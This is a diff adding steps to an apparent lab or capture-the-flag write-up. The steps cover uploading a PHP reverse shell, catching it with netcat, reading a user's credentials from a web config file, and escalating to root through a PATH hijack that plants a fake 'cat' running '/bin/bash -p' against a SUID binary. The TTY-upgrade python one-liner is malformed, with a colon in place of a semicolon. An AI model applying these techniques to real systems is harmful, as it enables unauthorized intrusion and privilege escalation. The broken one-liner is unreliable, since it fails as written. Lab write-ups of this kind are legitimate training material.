@@ -109,8 +109,49 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 
+-> you can now upload the php reverse shell payload.
 
+https://www.revshells.com/
 
+-> can help to create payloads, then you upload it and then access `/uploads` after finding it using gobuster
+
+-> start netcat and then navigate to `/uploads/shell.php` (your payload)
+
+-> then we get a reverse shell, then we can navigate to `/var/www/html/cdn-cgi/login/db.php` to get the credentials of robert, which is `M3g4C0rpUs3r!`
+
+-> but we cannot su using a reverse shell, so we use python3 command to upgrade to a TTY shell
+
+```bash
+python3 -c 'import pty:pty.spawn("/bin/bash")';
+```
+
+-> now run su robert and enter his credentials
+
+-> after logging in as robert, we can go and use
+
+```bash
+# find which group robert is in
+id
+
+# find all files owned by the group
+find / -group bugtracker 2>/dev/null
+```
+
+-> returns `/usr/bin/bugtracker` with a root suid.
+- running it and after inputting something, prompts a cat error, meaning that it execs cat
+
+-
+
+```bash
+# Make a temporary fake cat to overwrite the normal cat
+echo '/bin/bash -p' > /tmp/cat
+
+# Make it executable
+chmod +x /tmp/cat
+
+# Put it in the env variables
+export PATH=/tmp:$PATH
+```
 
 # Archetype
 
